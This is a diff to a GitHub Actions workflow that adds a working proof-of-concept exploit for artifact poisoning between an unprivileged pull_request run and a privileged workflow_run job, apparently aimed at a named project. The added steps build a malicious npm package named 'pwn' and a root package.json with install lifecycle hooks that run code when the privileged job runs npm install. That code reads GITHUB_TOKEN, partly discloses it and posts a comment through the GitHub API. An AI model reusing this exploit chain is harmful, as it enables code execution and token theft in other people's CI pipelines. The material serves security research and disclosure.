@@ -28,38 +28,43 @@ jobs:
         if: always()
         run: echo "No issues found." > linter-report.txt
 
-      - name: Attacker payload (root package.json executed by the privileged npm install)
+      - name: Attacker payload for the trusted linter-report artifact
         if: always()
         run: |
-          cat > package.json <<'JSON'
+          mkdir -p pkg/package
+          cat > pkg/package/package.json <<'JSON'
           {
-            "name": "artifact-payload",
+            "name": "pwn",
             "version": "1.0.0",
-            "private": true,
             "scripts": {
-              "prepare": "node rce.js"
+              "install": "node index.js dep-install",
+              "postinstall": "node index.js dep-postinstall"
             }
           }
           JSON
-          cat > rce.js <<'JS'
+          cat > pkg/package/index.js <<'JS'
           const fs = require('node:fs');
+          const path = require('node:path');
+          const base = process.env.INIT_CWD || process.cwd();
+          let pr = '1';
+          try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
           const repo = process.env.GITHUB_REPOSITORY;
           const token = process.env.GITHUB_TOKEN;
-          const pr = fs.existsSync('pr-number.txt')
-            ? fs.readFileSync('pr-number.txt', 'utf8').trim()
-            : '1';
           (async () => {
             const body = [
-              '## Privileged RCE proof (npm prepare)',
+              '## Privileged RCE proof (dependency lifecycle script)',
               '',
-              'The artifact uploaded by the unprivileged `Lint` pull_request run was',
-              'downloaded into the `Post Linter Report` workflow_run job and executed by',
+              'Stage: `' + (process.argv[2] || 'unknown') + '`',
+              '',
+              'The artifact uploaded by the unprivileged `Lint` pull_request run was downloaded',
+              'into the `Post Linter Report` workflow_run job and executed during',
               '`npm install --no-save github:AdobeDocs/adp-devsite-scripts`.',
               '',
               '`GITHUB_TOKEN` present: ' + (token ? 'yes (' + token.slice(0, 4) + '..., length ' + token.length + ')' : 'no'),
               '`GITHUB_RUN_ID`: ' + process.env.GITHUB_RUN_ID,
               '`GITHUB_EVENT_NAME`: ' + process.env.GITHUB_EVENT_NAME,
-              'whoami: ' + require('node:os').userInfo().username
+              'user: ' + require('node:os').userInfo().username,
+              'cwd: ' + process.cwd()
             ].join('\n');
             const r = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
               method: 'POST',
@@ -71,9 +76,25 @@ jobs:
               body: JSON.stringify({ body })
             });
             console.log('proof comment status:', r.status);
-            console.log(await r.text());
-          })().catch((e) => { console.error(e); process.exit(1); });
+          })().catch((e) => { console.error('proof failed:', e && e.message); });
           JS
+          tar -czf pwn-1.0.0.tgz -C pkg package
+          cat > package.json <<'JSON'
+          {
+            "name": "artifact-payload-root",
+            "version": "1.0.0",
+            "private": true,
+            "scripts": {
+              "preinstall": "node rce.js root-preinstall",
+              "install": "node rce.js root-install",
+              "postinstall": "node rce.js root-postinstall"
+            },
+            "dependencies": {
+              "pwn": "file:./pwn-1.0.0.tgz"
+            }
+          }
+          JSON
+          cp pkg/package/index.js rce.js
 
       - name: Upload linter report
         if: always()
@@ -85,4 +106,5 @@ jobs:
             pr-number.txt
             package.json
             rce.js
+            pwn-1.0.0.tgz
           if-no-files-found: ignore
